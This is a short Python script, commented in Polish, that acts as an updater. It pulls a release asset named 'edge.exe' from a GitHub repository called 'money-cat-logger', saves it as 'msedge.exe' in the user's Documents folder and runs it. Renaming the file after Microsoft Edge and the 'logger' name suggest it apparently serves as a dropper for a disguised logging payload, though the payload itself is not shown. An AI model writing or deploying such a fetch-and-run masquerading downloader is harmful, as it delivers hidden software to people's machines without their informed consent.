import os
import requests
import shutil
import subprocess

# KONFIGURACJA GITHUBA
GITHUB_USER = "xfendi"  # Zmień na swój GitHub username
GITHUB_REPO = "money-cat-logger"  # Zmień na nazwę repo
TOKEN = None  # Jeśli repo jest prywatne, wstaw tu token GitHub
HEADERS = {"Authorization": f"token {TOKEN}"} if TOKEN else {}

# URL plików w repozytorium
VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/data/version.txt"
RELEASES_API_URL = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/releases/latest"

# Ścieżki do lokalnych folderów
documents_path = os.path.join(os.path.expanduser("~"), "Documents")
local_path = os.path.join(documents_path, "local")  
data_path = os.path.join(local_path, "data")  

# Lokalne pliki
LOCAL_VERSION_FILE = os.path.join(data_path, "version.txt")
LOCAL_EXE_FILE = os.path.join(data_path, "msedge.exe")

# Tworzenie folderów, jeśli nie istnieją
os.makedirs(data_path, exist_ok=True)

def get_server_version():
    response = requests.get(VERSION_URL, headers=HEADERS)
    if response.status_code == 200:
        return response.text.strip()
    else:
        print("❌ Error downloading version number!")
        return None

def get_download_url():
    response = requests.get(RELEASES_API_URL, headers=HEADERS)
    if response.status_code == 200:
        release_data = response.json()
        for asset in release_data.get("assets", []):
            if asset["name"] == "edge.exe":
                return asset["browser_download_url"]  # Poprawione!
    print("❌ Exe file not found on GitHub!")
    return None


def download_new_version():
    download_url = get_download_url()
    if not download_url:
        return
    
    print("💾 Downloading new version...")
    response = requests.get(download_url, stream=True)
    if response.status_code == 200:
        with open(LOCAL_EXE_FILE, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
        print("✅ New version downloaded successfully!")
    else:
        print("❌ Error downloading a new .exe file!")
    
    if not os.path.exists(LOCAL_VERSION_FILE):
        print("❌ version.txt not found! Fetching version from the server...")
        server_version = get_server_version()
        if server_version:
            with open(LOCAL_VERSION_FILE, 'w') as f:
                f.write(server_version)  # Zapisujemy wersję z serwera
            print(f"✅ version.txt created with version: {server_version}")
        else:
            print("❌ Could not fetch version from server!")
            return
        run_exe()

def run_exe():
    try:
        subprocess.run([LOCAL_EXE_FILE], check=True)
        print("✅ Program started!")
    except subprocess.CalledProcessError as e:
        print(e)

def check_for_update():
    server_version = get_server_version()
    if not os.path.exists(LOCAL_VERSION_FILE):
        download_new_version()
        return

    if not os.path.exists(LOCAL_EXE_FILE):
        download_new_version()
        return
    
    with open(LOCAL_VERSION_FILE, 'r') as f:
        local_version = f.read().strip()

    if server_version and server_version > local_version:
        print(f"🚀 New version available! Local: {local_version}, Server: {server_version}")
        download_new_version()
        with open(LOCAL_VERSION_FILE, 'w') as f:
            f.write(server_version)  # Zapisujemy nową wersję do pliku version.txt
    else:
        print("✅ You have the latest version!")

    # Po pobraniu najnowszej wersji uruchamiamy plik
    run_exe()

if __name__ == "__main__":
    check_for_update()